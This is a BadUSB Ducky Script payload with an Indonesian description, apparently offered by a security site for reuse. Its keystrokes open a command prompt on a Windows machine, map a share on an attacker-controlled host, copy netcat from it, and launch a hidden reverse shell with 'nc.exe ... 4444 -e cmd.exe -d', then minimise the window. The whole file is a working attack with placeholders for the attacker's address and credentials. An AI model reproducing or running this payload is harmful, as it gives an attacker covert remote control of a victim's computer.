  REM Author : ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id
REM Version : 2.0
REM Description : Payload ini dirancang khusus oleh Xcod3bughunt3r untuk BadUSB Super, payload ini menggunakan gabungan perintah universal, seperti penggunaan CONTROL ESCAPE tapi juga untuk keluar dari cmd menggunakan ALT SPACE dan STRING C sehingga kompatibel dengan banyak windows (Windows 7, 8.1 dan 10), selain itu juga netcat berjalan secara tersembunyi dengan perintah nc.exe (ip publik / domain / subdomain) 4444 -e cmd.exe -d. Kelebihan penggunaan netcat dibandingkan menggunakan backdoor lain adalah netcat menerima domain / sub domain saat netcat melakukan koneksi ke komputer kita / target. 
DELAY 1000
CONTROL ESCAPE
DELAY 1000
STRING RUN
DELAY 1000
ENTER
DELAY 1000
STRING cmd
DELAY 1000
ENTER
DELAY 300
STRING taskkill /f /pid nc.exe
DELAY 200
ENTER
DELAY 200
STRING del c:\Users\Public\Downloads\nc.exe
DELAY 200
ENTER
DELAY 2000
STRING net use z: /delete
DELAY 200
ENTER
DELAY 200
STRING net use z: \\(ip public / domain / sub domain)\(nama folder yang dishare) /u:(username) (password)
DELAY 200
ENTER
DELAY 200
STRING copy z:\nc.exe c:\Users\Public\Downloads
DELAY 200
ENTER
DELAY 1000
STRING y
DELAY 200
ENTER
DELAY 200
STRING net use z: /delete
DELAY 200
ENTER
DELAY 1000
STRING c:\Users\Public\Downloads\nc.exe (ip publik / domain / subdomain) 4444 -e cmd.exe -d
DELAY 200
ENTER
DELAY 1000
ALT SPACE
STRING C
DELAY 200
